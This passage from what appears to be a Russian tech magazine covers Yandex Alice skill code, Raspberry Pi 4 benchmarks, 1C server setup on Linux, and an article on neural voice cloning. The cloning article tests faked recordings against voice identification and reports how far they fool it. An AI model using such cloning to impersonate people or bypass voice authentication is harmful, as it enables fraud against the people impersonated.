if __name__ == '__main__':
    app.run()

Как можно заметить, функция main осталась точ но такой же, как в первом
примере, основательно изменилась лишь функция handle_dialog.
  Поскольку для каждого из пользователей в памяти хранится собственный
набор доступных и исполь зованных слов, в функции random_word и get_nex‐
t_word в качестве параметра поступает ID игрока. По сути, handle_dialog —
это реализация нашей блок‐схемы.
  Обрати внимание на эту строчку:


word = req['request']['nlu']['tokens'][0]

В прошлой программе мы получали целиком всю фразу, а в этой мы работа‐
ем уже с токенами. Токены — это слова из фра зы, которые уже разобраны
тем или иным образом. Например, если во фразе есть адрес, то он будет
распознан как адрес. Токенизация позволяет не думать о таких вещах,
как орфография или заглавные буквы.


А ТЕПЕРЬ КАРТИНКИ
Хоть «Алиса» и голосовой помощник, она может отправлять пользовате лю
картинки. Напишем навык, который будет отправлять пользователю слу чай‐
ную картинку. Чтобы использовать изоб ражения, их необходимо загрузить
в твой личный кабинет на «Яндекс.Диало гах». Для это го переходи на вклад ку
«Ресурсы» и выбирай файлы.





После загрузки у каждой из картинок появится свой идентификатор. Именно
по ним мы и будем обращать ся.
   Чтобы отправить поль зователю картинку, необходимо модифицировать
наш JSON. Добавить ключ card с такими полями:
 • type — тип карточки, для добавления одно го изображения используется
  BigImage;
 • image_id — идентифика тор изоб ражения, полученный в предыдущем
   пункте;
 • title — заголовок картинки, который появляется вместе с ней.

Важно, что даже если мы отправляем картинку, нужно указывать уже зна‐
комый нам параметр — text, он необ ходим и не может быть пустым.
  Для хранения изоб ражений будем использовать спи сок кортежей вида (
id_картинки, заголовок). Как мы уже привыкли, функция main неизменна,
так что я приведу лишь handle_dialog и спи сок картинок.


Images  = [("965417/9f742cfaf8da737c9c92","Мартовский заяц"),(
"1540737/fe5ad9521bd078b5c625","Чеширский кот")]


def handle_dialog(res,req):
    if req['request']['original_utterance']:
        res['response']['text'] = "Это случайная картинка"
        img, title = random.choice(Images)
        ## Генерируем изображение
        res['response']['card'] = {
            "type": "BigImage",
            "image_id": img,
            "title": title
            }
    else:
        ## Если это первое сообщение — представляемся
        res['response']['text'] = "Привет! Ты мне фразу — я тебе
картинку"

Не забудь импортировать модуль random. Теперь, если мы запустим наш
навык на тестовом стенде, мы увидим следующее.





                  Тестирование навыка с картинками

Подробнее про формирова ние JSON и про то, как добавить нес колько изоб‐
ражений, можно прочитать в справке.


РАЗМЕЩЕНИЕ В СЕТИ
Теперь, когда мы уже научились делать раз ных ботов, можно задуматься
об их размещении в интернете, чтобы наш навык работал круглосуточно и не
был случайно вык лючен, ког да ты решишь отдохнуть от шума системника.
  Поскольку наш навык по своей сути — это сервер на Flask, для его запуска
подойдет практически любой хостинг, например Heroku или его аналоги.
Но для запуска первых навыков имеет смысл вос пользоваться каким‐то бес‐
платным ресурсом. В качес тве примера можно рассмотреть Pythonanywhere.
   Это не столько хостинг, хотя так им пользоваться тоже, конечно, можно,
сколько развернутая в интернете и доступная из любого места среда раз‐
работки на Python. Об использовании этого сервиса для разработки можно
почитать на «Хабре», а мы пос мотрим, как задеп лоить нашего бота.
  Для начала необ ходимо зарегистри роваться, после этого при входе ты
увидишь всю информацию о своих проектах, хра нящихся или запущенных
на сервисе.





                             Dashboard

Как видишь, на Dashboard есть отдельная вкладка Web apps. Откроем ее
и создадим новое приложение. Для него будет выделе но отдельное домен‐
ное имя ЛОГИН.pythonanywhere.com. В процессе соз дания у тебя будет воз‐
можность выбрать фреймворк — выбирай  Flask и версию  Python  (я
советую 3.6, но если ты писал на более новом или более старом, выбирай
свою).
  Среди твоих файлов появится папка mysite, а в ней — файл flask_app.
py. Копируем сюда код навыка и можем запускать. Не забудь только заменить
в настройках бота адрес сайта для обра ботки запросов — и все готово! :)
   Кстати, если тебе понравилось создавать навыки и ты хочешь углубить
свои знания — или если ты опытный раз работчик и хочешь рассказать
о чем‐то связанном с ботами, заг лядывай на «Бот кэмп», который пройдет
в Москве 19 октября 2019 года.


        WWW

                  •Официальная докумен тация «Алисы»
                    •Библиотека на Python для одновременного соз‐
                        дания навыков в «Алисе» и ботов в Telegram
                     •Репозиторий со всеми примерами из статьи
ТРЮКИ
  РЕЧЬ
   В РЕЧЬ

     СОЗДАЕМ НЕЙРОННУЮ СЕТЬ,
    КОТОРАЯ ПОДДЕЛЫВАЕТ ГОЛОС





                                      Михаил Киреев
                                               kireevmp@yandex.ru





Способов идентифицировать челове ка по голосу появляется
все больше. И параллельно исследова тели придумывают,
как обойти эти механизмы — и для защиты собствен ной пер‐
сональной информации, и для взлома защищенных таким
образом систем. Я решил разобраться в самых последних
достижениях  ученых  в  этой сфе ре,  чтобы  рассказать
обо всем тебе.


ГЕНЕРАЦИЯ ГОЛОСА
Голос человека — результат движения связок, языка, губ. В распоряжении
компьютера только чис ла, изоб ража ющие записанную микрофоном вол ну.
Как же компьютер создает звук, который мы можем услышать из динамиков
или наушников?


Текст в речь
Один из самых популярных и исследованных методов генерации звуков —
прямое преобразование текста, который нужно вос произвести, в звук. Самые
ранние программы такого рода склеивали отдель ные буквы в слова, а сло‐
ва — в предложения.
  С развитием программ‐синтезато ров набор заранее записанных на мик‐
рофон фонем (букв) стал набором сло гов, а затем и целых слов.
  Преимущества  таких программ очевидны: они просты в написании,
использовании, поддержке, могут вос про изво дить все слова, какие только
есть в языке, предсказуемы — все это в свое время стало причиной их ком‐
мерческого использования. Но качес тво голоса, соз данного таким методом,
оставляет желать лучшего. Все мы помним отличительные черты такого
генератора — бесчувственная речь, неп равильное ударение, оторванные
друг от друга слова и буквы.


Зву ки в речь
Этот способ генерации речи относительно быс тро заменил собой первый,
поскольку лучше имитиро вал человеческую речь: мы произносим не буквы,
а звуки. Именно поэтому системы, основанные на международном фонети‐
ческом алфавите — IPA, более качественны и приятны на слух.
  В основу этого метода легли заранее записанные в студии отдельные зву‐
ки, которые скле иваются в сло ва. По сравнению с первым под ходом заметно
качественное улучшение: вмес то простого склеива ния аудиодорожек исполь‐
зуются методы смешива ния звуков как на основе математических законов,
так и на основе нейронных сетей.


Речь в речь
Относительно новый подход полностью основан на нейронных сетях. Рекур‐
сивная архитектура WaveNet, постро енная исследователями из DeepMind,
позволяет преобразовывать звук или текст в другой звук напрямую, без прив‐
лечения заранее записанных стро ительных блоков (на учная статья).
  Ключ к этой технологии — правильное исполь зование рекурсивных ней‐
ронов Long Short‐Term Memory, которые сох раня ют свое состояние не только
на уровне каждой отдель ной клетки нейронной сети, но и на уровне все го
слоя.





                      Схема работы WaveNet

В целом эта архитектура работает с любым видом звуковой волны, вне
зависимости от того, музыка это или голос человека.


             INFO

                     На основе WaveNet есть нес колько проектов.
                   •A WaveNet for speech denoising — уничтожение
                      шумов в записи голоса;
                         •Tacotron 2 (статья в бло ге Google) — генерация
                          звука из мел‐спек трограммы;
                      •WaveNet  Voice  Enhancement —  улучшение
                          качества голоса в записи.


Для воссоздания речи такие системы исполь зуют генераторы звуковой
нотации из текста и генера торы инто наций (уда рения, паузы), чтобы создать
натурально звучащий голос.
   Это самая передовая технология создания речи: она не просто склеивает
или смешивает непонятные машине звуки, но самостоятельно создает
переходы между ними, делает паузы меж ду словами, меняет высоту, силу
и тембр голоса в угоду правиль ному произно шению — или любой другой
цели.


СОЗДАНИЕ ПОДДЕЛЬНОГО ГОЛОСА
Для самой простой идентификации, про которую я рас сказывал в своей пре‐
дыдущей статье, подой дет практически любой метод — особенно удачливым
хакерам может хватить даже необ работанных пяти секунд записанного
голоса. Но для обхода более серь езной системы, построенной, например,
на нейросетях, нам понадо бит ся нас тоящий, качественный генератор голоса.


Прин цип работы имитато ра голоса
Для  создания  правдоподобной  модели  «голос  в  голос»,  основанной
на  WaveNet,  потребуется множество  уси лий: нужно  записать большое
количество текста, сказанного двумя разными людьми, причем так, чтобы все
звуки совпадали секунда в секунду, — а сделать это сложновато. Однако есть
и другой метод.
  Основываясь все на тех же прин ципах, что и технология синтеза звука,
можно достичь не менее реалистичной переда чи всех параметров голоса.
Так, была создана программа, которая клониру ет голос на основе небольшой
записи речи. Именно ее мы с тобой и используем.
  Сама программа сос тоит из нес коль ких важных частей, которые работают
последовательно, поэтому разберемся поэтапно.


Ко диро вание голоса
Голос каждого человека обладает рядом характеристик — их не всегда мож‐
но распознать на слух, но они важны. Чтобы точно отделять одного говоря‐
щего от другого, будет правиль ным создать специальную нейронную сеть,
формирующую свои наборы признаков для раз ных людей.
   Этот кодировщик позволяет в дальнейшем не только переносить голос,
но и сравнивать результаты с желаемыми.





                  Так выглядят 256 характеристик голоса


Соз дание спек трограммы
На основе этих характеристик можно из текста соз дать мел‐спектрограмму
звука. Этим занимается синтезатор, в основе которого лежит Tacotron 2,
использующий WaveNet.





              Пример сгенерированной спектрог раммы

Сгенерированная спектрограмма содержит всю информацию о паузах, зву‐
ках и произношении, и в ней уже заложены все заранее вычисленные харак‐
теристики голоса.


Син тез зву ка
Теперь другая нейронная сеть — основанная на WaveRNN — будет постепен‐
но создавать из мел‐спектрограммы зву ковую волну. Эта звуковая волна
и станет воспроизводиться как готовый звук.
  Все характеристики основного голоса сохраня ются в синтезированном
звуке, который, пусть и не без трудностей, вос создает исходный голос
человека на любом тексте.


Тестирование метода
Теперь, зная, как создать правдоподоб ную имитацию голоса, давай попробу‐
ем применить это на практике. В прошлой статье я рассказывал про два
очень простых, но рабочих метода идентифика ции человека по голосу:
с использованием анализа мел‐кепстральных коэффици ентов и с помощью
нейронных сетей, специально обученных определять одного человека. Давай
узнаем, насколько хорошо мы можем обмануть эти сис темы под дельными
записями.
   Возьмем пятисекундную запись голоса мужчины и создадим две записи
с помощью нашего инстру мента. Оригинал и записи, которые у меня получи‐
лись, можно скачать или послушать.
  Сравним эти записи с помощью мел‐кепстральных коэффициентов.





                  Вид коэф фициентов на графике

Разница в коэффициентах также видна и в числах:


Синтез_1 ‐ оригинал: 0.38612951111628727
Синтез_2 ‐ оригинал: 0.3594987201660116

Как же отреагирует на такую хорошую подделку ней ронная сеть?


Синтез_1 ‐ оригинал: 89.3%
Синтез_2 ‐ оригинал: 86.9%

Убедить нейросеть оказалось возможно, но не в совершенстве. Серьезные
системы безопасности, которые установлены, нап ример, в банках, скорее
всего, смогут детектировать подделку, но человек, тем более по телефону,
вряд ли сумеет отличить нас тоящего собеседника от его компьютерной ими‐
тации.


ВЫВОДЫ
Подделать голос сейчас уже не так сложно, как было раньше, а это откры вает
большие возможности не только для хакеров, но и для создателей контента:
инди‐разработчики игр смогут сделать качественную и дешевую озвучку, ани‐
маторы — озвучить своих персонажей, а режиссеры фильмов — снять дос‐
товерную документалку.
  И пусть технологии качественного син теза речи еще только раз виваются,
но их потенциал уже сейчас захватывает дух. В ско ром времени все голосо‐
вые помощники обретут свой личный голос — не металлический, холодный,
а наполненный эмо циями и чувствами; чат с техподдержкой перестанет раз‐
дражать, а ты сможешь зас тавить свой телефон отвечать на неприятные звон‐
ки вместо тебя.
ТРЮКИ

 RASPBERRY PI      4

    ЧТО ДАЮТ ЧЕТЫРЕ ЯДРА И ЧЕТЫРЕ ГИГА
     В ЧЕТВЕРТОЙ РЕВИЗИИ «МАЛИНКИ»





                                                 faberge
                                       Цифровыхъ дѣлъ мастеръ
                                              fabulous.faberge@yandex.ru





Как и у людей, у компьютеров есть своя судьба — и складывается она зачас‐
тую по‐разному. Одни ведут раз меренную жизнь и тихо уходят на покой
в предназначенный срок. Другим уготова но впи сать свое имя в историю,
стать признанной легендой и даже породить целую субкультуру. Выход чет‐
вертой ревизии популярного одноплатника Raspberry Pi не оставляет скеп‐
тикам ни единого шанса: английский микрокомпьютер с нами всерьез
и надол го.





Получив в народе ласковое проз вище «малинка», RPi стал своего рода ZX
Spectrum для современной эпо хи. Парал лели можно проводить дол го: оба
компьютера появились на свет в Англии (да не где‐нибудь, а в Кембридже!),
оба предназначались в первую очередь для обра зования, но при этом легко
«переросли» отведенные рамки. Будучи не самыми производительными
для своего времени, они привлекали пользователей демократичной ценой,
простотой и, конеч но же, поддержкой со стороны сообщества.
   Хоть основатель Raspberry Pi Foundation Эбен Аптон и не получил пока
от английской королевы титул рыцаря, как это было с Клайвом Синклером
почти сорок лет назад, можно не сомневаться, что общественное признание
его заслуг еще впереди. Вполне возможно, через пару десятилетий кто‐то
из нового поколения хакеров и программистов с теплотой вспомнит свой
первый микрокомпьютер Raspberry, который помог определиться с выбором
жизненного пути. Да, Линус Торвальдс учился прог рамми рованию на Sinclair
QL, если ты не знал!


             INFO

                     Про сэра Клайва Син клера и разработ ку первых
                     микрокомпьютеров  в   Sinclair  Research  снят
                       художественно‐исто рический фильм Micro Men
                        с Мартином Фрименом в одной из главных ролей.
                       Успеха другой его работы — сериала «Шерлок» —
                         эта картина не получила, но если судьба пионе‐
                      ров ИТ тебя хоть сколько‐то интересует, фильм
                       однозначно стоит смотреть.


Думаю, теперь ты понимаешь, почему я прос то не мог пройти мимо Raspberry
Pi 4 и приобрел этот одноплатник, как только он появился у нас в свободной
продаже и максимальной комплектации. Официаль ных поставок в Россию,
насколько мне известно, пока не было, но перекуп щики вовремя подсуети‐
лись и завезли немного «малинок» для самых нетерпеливых энтузиастов.
Самое время узнать, что пригото вило нам нынешнее обновление!


ОБЗОР ПЛАТЫ
Лю бопытные детали можно обнаружить уже в комплектации. Плата не упа‐
кована в антистатический пакет — и это странно. Эбен Аптон упоминал, что
его команда старается максимально удешевить производство Raspberry Pi,
но это какая‐то уж слишком радикальная оптимизация затрат. Подобную эко‐
номию ожидаешь увидеть в применении к Raspberry Pi Zero за $5, но никак
не к флагманской модели за $55.
  Однако все это мелочи жизни, о которых сразу забываешь, едва озна‐
комившись с бумажной инс трукцией. Ты наверняка уже в курсе, что четвертая
версия  одноплатника поставляется  с  раз ными объ емами опе ративной
памяти на выбор. Летом Raspberry Pi Foundation анонсировала появление
сразу трех вариантов, с микросхемами LPDDR4 емкостью в один, два
или четыре гигабайта. Но в инс трукции содержится упоминание о еще одной
версии, которая, видимо, не дош ла до релиза — на целых восемь гигабайт!
Ого!





Про нее в новостях не было ни слова, и нам остается только гадать, по какой
причине разработчики решили отказаться от подобной модели. Вполне воз‐
можно, что итоговая стоимость «малинки» с такой микросхе мой памяти ока‐
залась слишком высокой и не укладывалась в философию дешевого компь‐
ютера, которой стараются придерживать ся в Кембридже. Кроме того, не сто‐
ит забывать, что выпуск нового поколения сразу в нескольких вариантах —
это смелый эксперимент и в самой орга низа ции никто пока не знает, какая
модель в итоге окажется наиболее популярной среди пользователей.
  В такой ситуации отложить выпуск вер сии на восемь гигабайт и оценить
спрос на ее ближайший аналог с четырь мя — вполне логичный шаг. Так что
вероятность выхода еще более производительного Raspberry Pi сохраняется,
тем более что разработчикам предстоит как‐то исправить аппаратную проб‐
лему совместимости с некоторыми блоками питания (об этом чуть ниже).
   Дальнейший осмотр самого микрокомпь ютера настолько неожиданных
сюрпризов не принес. Как и было заявлено, форм‐фактор остался прежним,
а вот расположение и набор разъ емов немного изменились, из‐за чего
одноплатник потерял обратную совместимость с некоторыми прежними
аксессуарами. В истории Raspberry Pi такое произошло, кстати, впервые,
если не считать оригинальные модели с пол норазмерны ми карточками SD.
Стоило ли оно того?
  Первое, что бросается в глаза, — разъ ем RJ45 для гигабитного Ethernet
поменяли местами с парой портов USB, переместив его ближе к выводам
PoE. Безусловно, такое изменение нап рашива лось само собой и только
облегчило разводку пла ты. К сло ву, теперь сеть и периферия USB висят
на отдельных интерфейсах. До это го их объединял общий хаб, что соз давало
проблемы при одновременном использовании.
  Кроме того, у нас наконец‐то появились два порта стандарта USB 3.0,
без него в 2019 году было бы совсем грустно. Это означает, что теперь есть
возможность подключать внешние SSD и про чую современную скоростную
периферию вроде веб‐камер с раз решением 4К. Можно даже собрать собс‐
твенный бюджетный NAS, бла го связка из USB 3.0 и гигабитного Ethernet рас‐
полагает к определен ного рода безумс твам — например, RAID на SSD. Кста‐
ти, ответственная за USB микросхема VIA VL805 общается с процессором
по PCI Express, и энтузиасты практически тут же наш ли способ работать с еще
более быстрыми дисками NVMe, просто отпаяв концентратор USB с платы.
Классный аппаратный хак!
  С боковой стороны убрали полноразмерный разъ ем HDMI, заменив его
парочкой Micro‐HDMI 2.0. Увы, они сто ят близ ко друг к другу, и из‐за этого
подклю чать переходники с толстыми коннекторами на хвостах будет неудоб‐
но. Зато теперь появилась воз можность выводить картинку сразу на два дис‐
плея. Производитель в анонсах нескромно пишет о том, что под держивается
«до двух дисплеев и до 4К@60», но на самом деле приходится выбирать: либо
два дисплея на 30 кадрах, либо один, но с плавным изображением.
  По сравнению с крохот ными разъемами видеоинтерфейсов олдскуль‐
ный  3,5‐миллиметровый  аудиоджек  кажется  огромным.  Удивительно,
но инженеры не только решили сохранить его, но еще и не стали выкидывать
возможность выводить на него аналого вый видеосигнал! Так что все жела‐
ющие могут попробовать вдохнуть жизнь в старые телевизоры и эмулировать
ретроигры на аутентичном экране.
  А вот с разъемом Mini‐USB раз работчики распрощались, теперь на его
месте ты найдешь USB Type‐C. По уверениям соз дателей, это позволяет про‐
кормить новый «камень», аппетиты которо го выросли до 3 ампер под наг‐
рузкой — в сум ме вну шитель ные 15 Ватт пот ребления. Нас колько верны
столь смелые заявления, мы обязательно выяс ним чуть позже, а пока лишь
замечу, что реализация стандарта USB Power Delivery на новой плате сломала
совместимость с нынешними бло ками питания у некоторой час ти пользовате‐
лей (включая меня). Если для тебя эта проблема критична, стоит подождать
следующей ревизии платы, в которой разработчики обе щали исправить
недочет.
   Слот для microSD оставили на сво ем законном месте. Если ты рассчи‐
тывал на встроенный флеш‐накопитель в новом поколении (как на RPi Com‐
pute Module, например), увы и ах — надеждам не суждено было сбыться. Я
тоже немного разочарован, если чес тно. На Raspberry Pi 2 этот разъем был
не самой удачной конструкции — и на моей плате раз болтал ся спустя некото‐
рое время, так что успешная загрузка системы с карты памяти происходила
через раз.
  Штыревые контакты GPIO также не претерпели изменений. С одной сто‐
роны, это позволило сохранить совместимость с сущес твующими платами
расширения, что приятно. С другой сто роны — как и раньше, очень не хватает
выведенного сигнала RESET для принудительной перезагрузки сис темы (нап‐
ример, автоматически с помощью микросхемы‐супервизора). Кроме того,
было бы здорово иметь хотя бы парочку дополнительных интерфейсов USB
на этом разъеме — чтобы было удобно поль зоваться той периферией,
которую не предполагается переподключать слишком часто (такие интерфей‐
сы почти всегда можно обна ружить в нижней части обычных десктопных
материнок).


САМЫЙ SOC: BCM2711
Однако самые интересные изменения произошли, конечно же, с централь‐
ным процессором. Теперь это SoC BCM2711 с четырьмя ядрами Cortex‐A72
на архитектуре ARMv8, что выводит про изво дительность системы на качес‐
твенно иной уровень. Предыду щие модели основывались на ядрах от Cortex‐
A7 (Raspberry Pi 2) до Cortex‐A53 (Raspberry Pi 3+), то есть с этим обновле‐
нием разработчики перемахнули сразу через нес коль ко сту пенек.
  В первую очередь это му способствовал переход на техпроцесс 28 нм.
Микросхемы на всех предыдущих версиях одноплатника изготавливались
по технологии 40 нм, и с выходом BCM2873 на RPi 3+ инженеры уперлись
в ограниче ния по площади кристалла. Более производительные ядра тре‐
бовали больше транзисторов, которые прос то негде было разместить.
Как видишь, пока Intel и AMD безуспешно штурмуют порог в 10 нм при раз‐
работке процессоров на х86, дру гие — более скромные — компании вполне
комфортно себя чувствуют на уже проверенных и давно обкатанных техпро‐
цессах.
  На текущий момент документации к микросхеме BCM2711 нет в открытом
доступе, но ты можешь частично удовлетво рить свое любопытство, озна‐
комившись с мануалом на Cortex‐A72.





Что касается периферии, то новая система на крис талле получила в свое рас‐
поряжение ускоритель трехмерной гра фики Videocore VI (500 МГц, 2160p).
Информации по GPU сейчас тоже немного, и остается только надеяться, что
по прошествии какого‐то времени в Broadcom под держат сообщество
и выложат соот ветствующий референс, как это произошло с Videocore IV
во вторую годовщину проекта Raspberry Pi. Все‐таки Эбен Аптон неоднократ‐
но заявлял, что их конечная цель — сделать со временем одноплатник мак‐
симально открытым.


ИНТЕРЕСНОСТИ
Пройдусь по самым важным пунктам из того, на что я обратил вни мание
при работе с RPi 4.


Проб лема USB PD
Чуть выше я уже замечал, что новый микрокомпьютер привередлив в плане
питания и согласится работать далеко не от каждой зарядки. Так, мой расчет
использовать вместе с «малиной» блок питания с USB‐C от MacBook Pro
не оправдался: они просто не смогли договориться. А ведь я ждал подобного
момента с 2017 года — иначе зачем вооб ще было затевать весь этот болез‐
ненный переход на унифицированный разъем?!
  Попытаемся понять, в чем же здесь проблема. Некоторые пользователи
на форумах высказывали предположение, что ноут бучные блоки питания
Apple не поддерживают зарядку с напряжени ем 5 В. Но это не так: наклейка
на одной из боковых поверхностей зарядки подтверждает, что устрой ство
реализует стандарт USB Power Delivery с уровнями 5/12/20 вольт. В этом лег‐
ко убедиться, просто подклю чив к бло ку питания обычный смартфон через
подходящий кабель.
  На самом деле причина кроется в схеме Raspberry Pi и частично в способе
электронной идентификации (eMark) кабелей некоторых производите лей
(Apple, Dell и других). Предлагаю убедиться в этом вмес те. Для этого при дет‐
ся найти документацию (PDF) на сайте и внимательней приглядеться к рас‐
пиновке разъема USB‐C.





Здесь резистор R79 соединяет с GND не один, а оба контакта СС1 и CC2. Кро‐
ме того, R1 уходит к контроллеру питания пла ты, хотя тоже дол жен быть
соединен с землей. Правиль ная схема приведена на рисунке ниже.





Детальнее ты можешь прочитать о проблеме на страничке Тайлера Варда.


Скры тый JTAG
Лю бопытные сюрпризы на этом не заканчиваются. Повертев «малинку» пару
минут в руках, ты наверняка обнаружишь, что на обратной стороне под разъ‐
емами USB разведен еще один загадочный интерфейс без какого‐либо при‐
паянного коннектора. Он маркирован как J5 на плате, но само по себе
это мало что объясняет.





Попробуем угадать его происхождение, исходя из количества контактов. Оче‐
видно, что это не обычный UART или USB — проводников тут целых семь.
По всей видимости, предполагается, что рядовому пользователю этот разъ ем
никогда не пригодится. Хм‐м, чем же таким особенным может быть занят раз‐
работчик?
  А что если это интерфейс для отладки? Ну конечно! Несколько запросов
в поисковике пролили свет на назначение таинс твенного разъема  J5:
это  JTAG  графического  ускорителя  Videocore.  Оказывается,  кое‐кто
в интерне те уже задавался этим вопросом, подробности ты можешь про‐
читать в заметке Энди Кир би.


Загрузка с EEPROM
Еще одна примечатель ная особенность нового Raspberry Pi — это загрузка
с распаянной на плате микросхемы SPI EEPROM емкостью в 4 Мбита. Если
помнишь, раньше одноплатнику для старта нужен был ‘bootcode.bin’ в заг‐
рузочном разделе карты памяти. В новом дистрибутиве Raspbian этот файл
остался на своем месте, но лишь для поддержки предыдущих версий компь‐
ютера.
  Сами разработчики указывают нес колько причин для такого решения.
Во‐первых, возросла сложность интерфейсов, на которых подключается
память и периферия — теперь это LPDDR4 и PCI Express, а они требуют зна‐
чительно больше кода для инициализации. Прежде была воз можность ком‐
пактно разместить все в области ROM на самом SoC, но теперь для них
не нашлось достаточно мес та.
   Во‐вторых, у команды большие планы по добавлению новых функций: так,
в скором времени они обещают реализовать заг рузку с USB и по Ethernet.
Печально, что такая возможность нам не дос тупна с момента начала продаж
устройства,  но, по крайней мере, понятно,  чего именно  стоит ждать
в обновлениях прошив ки.
  Наконец, не стоит забывать, что такой способ позволяет проще устранять
ошибки (или добавлять новые!). Кстати, c подоб ными целями ты можешь
поковырять загрузчик и его бета‐версию самостоятельно:


$ sudo apt install rpi‐eeprom


ТЕСТЫ
Сегодня одноплатники мас сово про изво дятся в самых раз ных форм‐фак‐
торах, и только крупных компаний на этом рынке лег ко нас читать с десяток.
Конечно, Raspberry Pi Foundation выгодно выделяется на их фоне своей
известностью, но здоровая конкуренция позволяет покупателям подбирать
оптимальное решение для своих задач. А что помогает при нять решение
в первую оче редь? Конечно же тес ты!


           WARNING

                    Во время знакомства с Raspberry Pi 4 выяснилась
                       интересная особенность модуля Wi‐Fi: если выс‐
                         тавить регион RU в настройках микрокомпьюте‐
                          ра,  то попытка подключения  к  точке доступа
                        с диапазоном частот 5 ГГц (802.11ac) завершится
                        с ошибкой. Звучит невероятно, но я столкнулся
                     именно с  такой проблемой, и  только  чтение
                     форумов помогло прояснить причину.


Лично меня в новом микрокомпь ютере боль ше всего интересует память
и процессор, поэто му предлагаю начать с них. Производительность ЦП
замерим с помощью бенчмарка HWBot Prime, а характеристики ОЗУ оценим
по результатам утилиты Sysbench. Но прежде всего сконфигурируем систему
на максимальное быстро действие командой:


$ echo "performance" | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/
scaling_governor

Теперь установим сам бенчмарк:


$ wget http://downloads.hwbot.org/hwbotprime.jar

Для него требуется OpenJDK, которой у тебя в системе может и не быть, так
что заберем заодно и ее:


$ apt‐get install openjdk‐8‐jre

После этого запускаем тест и наблюдаем резуль тат.





  Процессор определился неправильно, а вот с частотой и количеством
  оперативки проб лем не возникло

Думаю, тебе будет интересно узнать, что предыдущая модель «малинки»
набирала в этом тесте всего лишь около 440 «попугаев» на стандартных час‐
тотах и примерно 520 при экс тремальном разгоне с жидким азотом и отри‐
цательными тем пературами. Такие любопытные данные приводили оверкло‐
керы   из   команды   K|ngp|n   в   выпус ке   журнала   HackSpace
за декабрь 2017 года. Чет вертая версия оставляет эти результаты далеко
позади и демонстрирует впечатляющий прирост более чем в шесть раз!
Какие же показатели стоит ждать от оперативной памяти?
  Комплект тестов Sysbench устанавлива ется еще проще:


$ apt‐get install sysbench

Здесь я не буду пересказывать все возможные нас тройки и объ яснять, за что
отвечают конкретные параметры этой утилиты, — как всегда, ты сможешь
найти детальное описание с помощью команды ‐‐help. Мне же вновь хочет‐
ся сравнить между собой новую и ста рую ревизии одноплатника:



  $ sysbench —test=memory —num‐threads=4 —memory‐access‐mode=rnd ‐‐memory‐
  total‐size=800M run
  sysbench 0.4.12: multi‐threaded system evaluation benchmark


  Running the test with following options:
  Number of threads: 4


  Doing memory operations speed test
  Memory block size: 1K


  Memory transfer size: 800M
  Memory operations type: write
  Memory scope type: global
  Threads started!
  Done.


  Operations performed 819200 (1374234.65 ops/sec)
  800.00 MB transferred (1342.03 MB/sec)


И вот тут неожиданный результат: третья версия демонс трировала пропус‐
кную способность на уровне 2210 Мбайт/с, а здесь даже 1400 не набирается!
Единственное объяснение, какое я вижу: современное ОЗУ на основе
динамической памяти нельзя считать полностью «случайным» в плане вре‐
мени доступа: накладные рас ходы неизбежны в любом случае. А современ‐
ные  интерфейсы  памяти  стараются  оптимизировать  скорее  в  пользу
последовательного чтения, для работы совмес тно с кешем процес сора.
Поэтому однозначный вывод о производительности здесь сделать сложно.
   Также я решил протес тировать графичес кую подсистему Videocore  VI
на страничке WebGL Aquarium. Современные планшеты здесь справляются
с отрисовкой 15 тысяч рыбок, сохраняя час тоту обновления картинки на уров‐
не 30 кадров в секунду. Воз можнос ти Raspberry Pi в этом плане гораздо
скромнее, но и результат в 500 рыбок можно считать достойным для встро‐
енной графики.





Несколько дополнительных тес тов (включая картинки с тепловизора) ты
можешь найти на страничке раз работчиков. Обра ти внимание, насколько
экономичным получился новый одноплатник при всех своих достоинс твах.





ОБЩИЕ ВПЕЧАТЛЕНИЯ
В целом новый Raspberry  Pi определен но удался. Пожалуй, это первая
модель, которой действительно комфортно поль зоваться в качестве замены
офисного неттопа или домашнего ПК, если тот используется в основном
для запуска браузера. Нет, конечно, видео в 4К на YouTube ты на нем не
посмотришь, но вряд ли кто‐то всерьез ожидал подобного. Тем более Rasp‐
berry Pi — это по‐прежнему отличный эмулятор ста рых игровых платформ
и хорошая основа для медиацентра. Не говоря уже про всякое гиковство,
мейкерство и хакерство. Ну да не мне тебе рассказывать!
АДМИН

  ЭКОНОМИМ
  НА «ВИНДЕ»





 КАК ОПТИМИЗИРОВАТЬ ЗАТРАТЫ НА СОФТ
       НА ПРИМЕРЕ БУХГАЛТЕРИИ





Изображенный на сто долларовой купюре
президент Бенджамин Фран клин когда‐то
предос терегал  потомков  от  напрасных
трат, напоминая, что даже маленькая течь
способна  потопить  большой  корабль.       Александр «Plus» Рак                                                                                         Участник сообщества Om‐
В сфере IT существует несколько вполне        skLUG.электронногоИнженер отдела
законных  способов  сэкономить. Можно         взаимодействия"ИнформационноМКУ
перевести предприятие на  Linux, можно        техническогоplus@omsklug.comуправления".
использовать Zentyal вместо служ бы Active
Directory, а еще можно настро ить под Linux
сервер 1С, переведя работу бухгалте рии
на бесплатную платформу. Чем мы сегодня
и займемся, попутно сэконо мив еще и
на сервере тер миналов.


УСТАНОВКА И НАСТРОЙКА
Серверная версия 1С для Linux допус кает до 14 технологических клиентских
подклю чений даже без лицензии, но это не означает, что лицензию не нужно
покупать. Можно установить программу, про тес тировать и оценить ее воз‐
можности. Дистрибутив доступен на портале 1С при наличии под писки ИТС,
а если хорошенько поискать, в интернете можно найти и дру гие источники
загрузки.
  Для начала работы с 1С в Linux (я использую CentOS 7 и 1С вер‐
сии 8.3.2033) нужно установить PostgreSQL. Но перед этим придется подклю‐
чить репозитории PostgreSQL для 1С:


$ sudo rpm ‐ivh http://1c.postgrespro.ru/keys/postgr
espro‐1c‐centos94.noarch.rpm

Далее переходим непос редственно к установке PostgreSQL Pro:


$ sudo yum update && sudo yum install postgresql‐pro‐1c‐9.5

Для удобства администрирова ния базы можно установить в своей локальной
системе pgAdmin, вер сии которого имеются не только для Linux, но также
для Windows и macOS. А мож но использовать консоль — su postgres. Затем
под учеткой пользователя postgres инициализируем служебные базы данных
с русской локализацией:


$ initdb ‐‐locale=ru_RU.UTF‐8

Теперь запускаем сервер СУБД PostgreSQL:


$ systemctl enable postgresql‐9.5
$ systemctl start postgresql‐9.5
$ systemctl status postgresql‐9.5

Переходим к 1С. Установочный пакет сервера 1С для Linux представляет
собой архив с именем rpm64.tar.gz. Рас пакуй хранящиеся внутри фай лы
с расширением .rpm в какую‐нибудь папку, перейди в нее и запус ти установку
программы сле дующей командой:


$ yum localinstall *.rpm

Если  ты  не  используешь  дополнения  1С,  расширения,  какие‐либо
